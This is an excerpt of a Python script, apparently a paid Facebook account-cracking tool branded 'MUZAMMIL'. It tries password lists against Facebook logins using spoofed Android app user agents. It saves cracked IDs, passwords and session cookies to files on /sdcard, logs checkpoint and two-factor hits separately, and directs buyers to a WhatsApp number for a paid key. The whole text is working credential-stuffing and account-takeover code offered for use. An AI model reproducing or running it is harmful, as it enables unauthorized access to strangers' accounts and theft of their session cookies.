...
try:
	...
	os.system('python MUZAMMIL_enc.py')
...
def pp():
	...
	try:
			...
			if ky in ck:
				...
				os.system('xdg-open https://wa.me/+923188201745?text=*HELLO*%2C%20*SIR*%20*I*%20*WANT*%20*TO*%20*BUY*%20*TOOL*%20MUZAMMIL*%20*TOOL*%20*PAID*%20*APPROVAL*%20/%20%20*My*%20*Key*%20*:*%20'+str(ky))
				pp()
...
def rd1(ids,passlist):
    try:
        ...
        sys.stdout.write('\r\r\033[1;37m [MUZAMMIL-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                ...
                if 'session_key' in po:
                        ...
                        print('\r\r\033[1;32m [MUZAMMIL-OK] '+uid+' √ '+pas)
                        open('/sdcard/MUZAMMIL-R-OK.txt','a').write(uid+'|'+pas+'\n')
                        open('/sdcard/MUZAMMIL-R-COKI-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                        oks.append(uid)
                        break
                elif 'www.facebook.com' in po['error']['message']:
                        uid = str(po['error']['error_data']['uid'])
                        print(f'\r\r\x1b[38;5;205m [MUZAMMIL-CP] '+uid+' | '+pas+'\033[1;97m')
                        open('/sdcard/MUZAMMIL-R-CP.txt','a').write(uid+'|'+pas+'\n')
                        break
                else:
                    continue
        loop+=1
...
def api2(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/90.0.0.1.126;FBBV/26655917;[FBAN/FB4A;FBAV/362.0.0.71.17;FBBV/24064508;FBDM/{density=2.0,width=511,height=4455};FBLC/en_US;FBRV/54484190;FBCR/Damag Syria;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973F;FBSV/8.5;FBOP/19;FBCA/arm64-v8a:;]"
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [MUZAMMIL-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/MUZAMMIL-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/MUZAMMIL-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[MUZAMMIL-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [MUZAMMIL-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MUZAMMIL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/MUZAMMIL-CP.txt','a').write(ids+'|'+pas+'\n')
